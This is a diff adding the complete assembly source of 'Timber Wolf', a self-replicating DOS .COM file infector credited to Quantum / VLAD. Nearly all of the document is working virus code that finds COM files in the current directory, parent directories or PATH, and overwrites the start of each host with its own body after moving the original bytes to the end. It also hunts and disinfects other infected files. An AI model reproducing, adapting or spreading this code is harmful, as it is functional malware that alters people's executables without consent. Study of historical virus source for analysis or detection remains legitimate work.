@@ -1,0 +1,318 @@
+;
+; "Timber Wolf" by Quantum / VLAD
+;
+; If you have a look at the animal kingdom, you can see two distinct groups
+; of animals.  There are the ones who hide and breed as much as they can
+; with the idea that, the more offspring they have the more chance their
+; species has for survival.  And then there are the ones who hunt those that
+; hide, outrun any would-be predators and have their offspring in large
+; litters.  Most virii fall into the first category.  This virus falls
+; into the second.
+;
+; It's a non-resident com infector that doesn't stay for long on the one
+; executable.  It jumps from com to com, hunting appending and prepending
+; com infections.  If it comes in contact with another one of its kind they
+; will run together in a pack but still with an individual nature - randomly
+; selecting whether to move and what to attack.
+;
+
+vstart:
+
+mov si,offset retcode               ; put the return code far
+mov di,0fcedh - (vend - vstart) - (vend - retcode) - 2
+mov cx,(vend-retcode)/2+1
+rep movsw
+
+genretcodeend:
+
+mov ax,[2ch]    ; get the segment of the enviroment
+mov ds,ax
+xor si,si       ; start at offset 0
+loop1:
+lodsb           ; look for a zero
+or al,al
+jnz loop1
+lodsb           ; followed by another zero
+or al,al
+jnz loop1
+lodsw
+cmp ax,1        ; then a 1 and a zero
+jnz loop1
+mov di,0fcf0h   ; si now points to the arg 0
+xor cx,cx       ; count the num of bytes copied
+loop2:
+lodsb
+inc cx
+or al,al        ; stop on a zero
+jz outty1
+cmp al,"a"      ; convert lowercase to uppercase
+jb noand
+cmp al,"z"
+ja noand
+and al,5fh
+noand:
+stosb           ; copy byte
+jmp loop2
+outty1:
+stosb           ; dont forget the final zero
+
+push cs
+pop ds
+mov [0fcedh],cx  ; store the num of bytes copied
+
+mov ah,1ah
+mov dx,0fdf0h    ; set the dta
+int 21h
+
+mov ah,47h
+xor dx,dx
+mov si,0fcedh - (vend - vstart) - (vend - retcode) - 2 - 64
+int 21h
+
+mov byte ptr [si-1],"\"
+
+in al,40h
+cmp al,53            ; one in 256 chance that we go dot dot regardless
+jz godadotdot
+cmp al,61            ; one in 256 chance that we infect the path
+jnz finddafirst
+
+mov ax,[2ch]
+mov es,ax
+
+mov al,"P"
+xor di,di
+findp:
+mov cx,0ffffh
+repne scasb                       ; search for a "P"
+mov si,offset ath
+mov cx,3
+rep cmpsb                         ; next 3 bytes = "ATH" ?
+jnz findp
+mov al,";"
+push es
+pop ds
+lea dx,[di+1]                     ; dx = path 2 infect
+mov cx,0ffffh
+repne scasb                       ; search for a ";"
+mov byte ptr [di-1],0             ; replace with a zero
+mov ah,3bh
+;int 21h                           ; change into that dir
+push cs
+push cs
+pop ds
+pop es
+finddafirst:
+mov ah,4eh
+xor cx,cx
+mov dx,offset fspec   ; find first com
+int 21h
+isitkewl:
+jnc checkinfect
+godadotdot:
+mov ah,3bh
+mov dx,offset dotdot
+int 21h
+jnc finddafirst
+outtyout:
+mov ah,3bh
+mov dx,0fcedh - (vend - vstart) - (vend - retcode) - 2 - 64 - 1
+int 21h                 ; change to original dir
+jmp 0fcedh - (vend - vstart) - (vend - retcode) - 2 ; outtie on error
+checkinfect:
+mov si,0fdf0h+1eh
+mov di,0fcedh-80h
+push di
+mov ah,60h
+int 21h               ; generate fully qualified filename
+pop di
+mov si,0fcf0h
+mov dx,di
+mov cx,[0fcedh]
+rep cmpsb             ; found file = arg 0 ?
+jnz infectit
+thatnogood:
+mov ah,4fh
+int 21h               ; if so find next file
+jmp isitkewl
+infectit:
+
+in al,40h
+cmp al,23                     ; random enough chance that we wont infect
+ja thatnogood
+cmp word ptr [0fdf0h + 1ah],vend-vstart         ; found file big enough ?
+jb thatnogood
+cmp word ptr [0fdf0h + 1ah],0fcedh - (vend - vstart) - (vend - retcode) - 2 - 64
+ja thatnogood                                   ; found file too big ?
+
+mov ax,3d02h
+int 21h                 ; open in read/write mode
+
+xchg bx,ax
+
+mov ah,3fh
+mov cx,vend-vstart                     ; read in where the virus will go
+mov dx,0fcedh - (vend - vstart)
+int 21h
+
+call seeke                        ; goto end of file
+
+add ax,100h                         ; calculate where the host code will be
+mov [offset whereorgat],ax
+
+mov cx,vend - vstart          ; write the host code to end of the file
+mov dx,0fcedh - (vend - vstart)
+call writefile
+
+call seeks                        ; back to the start of the file
+
+inc byte ptr [offset infectcount]
+cmp byte ptr [offset infectcount],15
+jb nokillcount
+mov byte ptr [offset infectcount],0
+nokillcount:
+
+mov cx,vend-vstart                  ; write out the virus code
+mov dx,0100h
+call writefile
+
+mov ah,3eh                          ; close file
+int 21h
+
+in al,40h
+and al,111b
+inc al
+cmp byte ptr [offset infectcount],al
+ja disinfect
+
+jmp outtyout                        ; back 2 host
+
+disinfect:
+
+mov ax,03d02h                       ; open arg 0
+mov dx,0fcf0h
+int 21h
+
+xchg bx,ax
+
+mov dx,offset whereorgat-100h -1  ; goto "mov si,whereorgat" in our code
+call seek2dx
+
+mov ah,3fh                          ; read it in
+mov cx,3
+mov dx,0fcedh - (vend - vstart)
+int 21h
+
+; if the mov si, bit isn't there then we have been done by a prepending
+cmp byte ptr [0fcedh - (vend - vstart)],0beh
+jz continuedisinfect
+
+call seeke       ; seek to the end of the file
+
+sub ax,genretcodeend-vstart    ; sub off the size of the first bit of our code
+mov dx,ax
+call seek2dx                 ; seek to that pos
+
+
+readincode:
+
+mov ah,3fh                             ; read in the string
+mov cx,genretcodeend-vstart
+mov dx,0fcedh - (vend - vstart) + 3
+mov si,dx
+push cx
+int 21h
+pop cx
+
+mov di,0100h                           ; is it our code ?
+rep cmpsb
+jz foundmycode
+call seekc                             ; no.. get the current position
+
+dec ax                                 ; decrease by one
+mov dx,ax
+call seek2dx                          ; goto that pos
+or ax,ax               ; if we're at the top of the file then all is not good
+jnz readincode
+; fucking overwriting virus wasted our code!!!!!!
+mov ah,3eh                    ; let's just leave
+int 21h
+jmp outtyout
+foundmycode:                    ; we found the string
+mov ah,3fh                      ; read in the rest of the file
+mov cx,0ffffh
+mov dx,0fcedh - (vend - vstart)
+int 21h
+
+push ax                    ; back to the start of the file
+push dx
+call seeks
+pop dx
+pop cx
+
+call writefile              ; write the code back
+
+continuedisinfect:          ; continue the disinfection
+
+mov dx,[0fcedh - (vend - vstart) + 1]   ; goto where da original code is at
+dec dh
+push dx
+call seek2dx
+
+mov ah,3fh                          ; read in the original host code
+mov cx,vend-vstart
+mov dx,0fcedh - (vend - vstart) + 3
+int 21h
+
+call seeks                       ; back to the start of the file
+
+mov cx,vend-vstart                  ; write out the host code
+mov dx,0fcedh - (vend - vstart) + 3
+call writefile
+
+pop dx
+call seek2dx                      ; back to the orginal EOF
+
+xor cx,cx                           ; cut off the rest of the file
+call writefile
+
+mov ah,3eh                          ; close the file
+int 21h
+
+jmp outtyout
+
+seek2dx: mov ax,04200h
+         jmp seek1
+seekc: mov ax,04201h
+       jmp lseek
+seeks: mov ax,04200h
+       jmp lseek
+seeke: mov ax,04202h
+lseek: xor dx,dx
+seek1: xor cx,cx
+       int 21h
+       ret
+
+
+writefile: mov ah,40h
+           int 21h
+           ret
+
+db "Timber Wolf by Quantum / VLAD",0
+ath db "ATH"
+dotdot db "..",0
+infectcount db 0
+fspec db "*.com",0
+retcode:
+db 0beh                             ; mov si,
+whereorgat dw offset orghost
+mov di,0100h
+push di
+mov cx,vend - vstart
+rep movsb                           ; move original code back to 100h
+ret                                 ; jump there
+vend:
+; host code
+orghost:
+int 20h
+
